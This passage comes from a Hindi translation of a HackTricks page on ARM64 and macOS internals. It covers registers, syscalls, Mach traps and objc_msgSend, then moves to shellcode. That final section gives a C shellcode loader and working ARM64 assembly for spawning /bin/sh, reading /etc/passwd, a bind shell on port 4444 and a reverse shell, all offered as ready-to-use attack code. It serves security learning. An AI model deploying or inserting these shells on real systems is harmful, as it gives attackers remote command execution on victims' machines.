* **`J`** और **`T`** बिट: **`J`** 0 होना चाहिए और यदि **`T`** 0 है तो निर्देश सेट A32 का उपयोग किया जाता है, और यदि यह 1 है, तो T32 का उपयोग किया जाता है।
* **IT ब्लॉक स्थिति रजिस्टर** (`ITSTATE`): ये 10-15 और 25-26 से बिट हैं। ये एक **`IT`** प्रिफिक्स ग्रुप के भीतर निर्देशों के लिए स्थितियाँ संग्रहीत करते हैं।
* **`E`** बिट: **एंडियनेस** को दर्शाता है।
* **मोड और अपशिष्ट मास्क बिट्स** (0-4): वर्तमान निष्पादन स्थिति निर्धारित करते हैं। पांचवां वाला यह दिखाता है कि क्या कार्यक्रम 32-बिट (1) या 64-बिट (0) के रूप में चल रहा है। अन्य 4 वर्तमान में उपयोग किए जा रहे अपशिष्ट मोड को दर्शाते हैं (जब एक अपशिष्ट होता है और इसे संभाला जा रहा है)। संख्या सेट **वर्तमान प्राथमिकता** को दर्शाती है जिसका अर्थ है कि यदि इसे संभालते समय एक और अपशिष्ट ट्रिगर होता है।

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: कुछ अपशिष्ट को बंद किया जा सकता है उपयोग करके बिट्स **`A`**, `I`, `F`। यदि **`A`** 1 है तो इसका अर्थ है कि **असमकालिक अबॉर्ट्स** ट्रिगर होंगे। **`I`** बाह्य हार्डवेयर **इंटरप्ट रिक्वेस्ट्स** (IRQs) का प्रतिक्रिया देने के लिए कॉन्फ़िगर करता है। और F **फास्ट इंटरप्ट रिक्वेस्ट्स** (FIRs) से संबंधित है।

## macOS

### BSD सिसकॉल्स

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) की जाँच करें। BSD सिसकॉल्स में **x16 > 0** होगा।

### Mach ट्रैप्स

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) में `mach_trap_table` और [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) में प्रोटोटाइप्स की जाँच करें। Mach ट्रैप्स में **x16 < 0** होगा, इसलिए आपको पिछली सूची से नंबर को एक **माइनस** के साथ कॉल करने की आवश्यकता है: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`** है।

आप इन्हें (और BSD) सिसकॉल्स कैसे कॉल करने के लिए खोजने के लिए एक disassembler में **`libsystem_kernel.dylib`** की जाँच कर सकते हैं:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
कभी-कभी **`libsystem_kernel.dylib`** से **डिकंपाइल** कोड की जाँच करना **स्रोत कोड** की जाँच से आसान होता है क्योंकि कई सिसकॉल्स (बीएसडी और मैक) का कोड स्क्रिप्ट्स के माध्यम से उत्पन्न किया जाता है (स्रोत कोड में टिप्पणियों की जाँच करें) जबकि dylib में आपको यह मिल सकता है कि क्या कॉल किया जा रहा है।
{% endhint %}

### machdep कॉल

XNU एक और प्रकार के कॉल का समर्थन करता है जिसे मशीन निर्भर कहा जाता है। इन कॉल की संख्या वास्तविकता और न कॉल और न ही संख्याएँ स्थिर रहने की गारंटी है।

### comm पेज

यह एक कर्नेल मालिक मेमोरी पेज है जो हर उपयोगकर्ता प्रक्रिया के पते में मैप किया जाता है। यह उपयोगकर्ता मोड से कर्नेल स्पेस में जाने की तुलना में कर्नेल सेवाओं के लिए सिसकॉल का उपयोग करना ज्यादा असरदार है।

उदाहरण के लिए कॉल `gettimeofdate` `timeval` के मान को सीधे comm पेज से पढ़ता है।

### objc\_msgSend

यह फ़ंक्शन Objective-C या Swift कार्यक्रमों में उपयोग किया जाने वाला बहुत ही सामान्य है। यह फ़ंक्शन एक Objective-C ऑब्जेक्ट का एक मेथड कॉल करने की अनुमति देता है।

पैरामीटर ([अधिक जानकारी दस्तावेज़ में](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> इंस्टेंस के पॉइंटर
* x1: op -> मेथड का सेलेक्टर
* x2... -> आमंत्रित मेथड के शेष तर्क

इसलिए, यदि आप इस फ़ंक्शन के शाखा के पहले ब्रेकपॉइंट डालते हैं, तो आप आसानी से lldb में जांच सकते हैं कि इसमें क्या आमंत्रित है (इस उदाहरण में ऑब्जेक्ट `NSConcreteTask` से ऑब्जेक्ट कॉल करता है जो एक कमांड चलाएगा):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
चरित्र **`NSObjCMessageLoggingEnabled=1`** को सेट करने से इस फ़ंक्शन को जब कॉल किया जाता है तो `/tmp/msgSends-pid` जैसी फ़ाइल में लॉग करना संभव है।

इसके अतिरिक्त, **`OBJC_HELP=1`** को सेट करके और किसी भी बाइनरी को कॉल करके आप देख सकते हैं कि आप किस प्रकार के अन्य पर्यावरण चर उपयोग कर सकते हैं जब कुछ निश्चित Objc-C क्रियाएँ होती हैं।
{% endhint %}

जब यह फ़ंक्शन कॉल होता है, तो इस निर्दिष्ट उदाहरण के तत्व का पता लगाना आवश्यक होता है, इसके लिए विभिन्न खोज की जाती हैं:

* आशावादी कैश लुकअप करें:
* यदि सफल हो, तो समाप्त
* रनटाइमलॉक प्राप्त करें (पढ़ें)
* यदि (रियलाइज़ और !cls->realized) तो कक्षा को रियलाइज़ करें
* यदि (आरंभ करें और !cls->initialized) तो कक्षा को प्रारंभ करें
* कक्षा का खुद का कैश प्रयास करें:
* यदि सफल हो, तो समाप्त
* कक्षा का विधि सूची प्रयास करें:
* यदि पाया गया, तो कैश भरें और समाप्त
* उपकक्ष कैश प्रयास करें:
* यदि सफल हो, तो समाप्त
* उपकक्ष विधि सूची प्रयास करें:
* यदि पाया गया, तो कैश भरें और समाप्त
* यदि (रिज़ॉल्वर) विधि रिज़ॉल्वर का प्रयास करें, और कक्षा लुकअप से दोहराएं
* अगर फिर भी यहाँ हैं (= सभी अन्य विफल हो गए हैं) तो फॉरवर्डर का प्रयास करें

### शैलकोड

कॉम्पाइल करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स को निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
### नए macOS के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>शैलकोड का परीक्षण करने के लिए सी कोड</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### शैल

[**यहाँ से**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) लिया गया है और समझाया गया है।

{% tabs %}
{% tab title="adr के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% टैब शीर्षक="स्टैक के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="एडीआर के साथ लिनक्स के लिए" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}
{% endtabs %}

#### कैट के साथ पढ़ें

उद्देश्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को execute करना है, इसलिए दूसरा तर्क (x1) पैरामीटरों का एक एरे है (जिसका मतलब है कि मेमोरी में ये पते का स्टैक है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### एक फोर्क से एसएच के साथ कमांड को आमंत्रित करें ताकि मुख्य प्रक्रिया को मार नहीं दिया जाए
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### बाइंड शैल

बाइंड शैल [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) में **पोर्ट 4444** से
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### रिवर्स शैल

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) से, **127.0.0.1:4444** के लिए रिवशैल।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{% hint style="success" %}
**AWS हैकिंग सीखें और अभ्यास करें:**<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
**GCP हैकिंग सीखें और अभ्यास करें:** <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **हमें** **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) **github रेपो में PR जमा करके।**

</details>
{% endhint %}
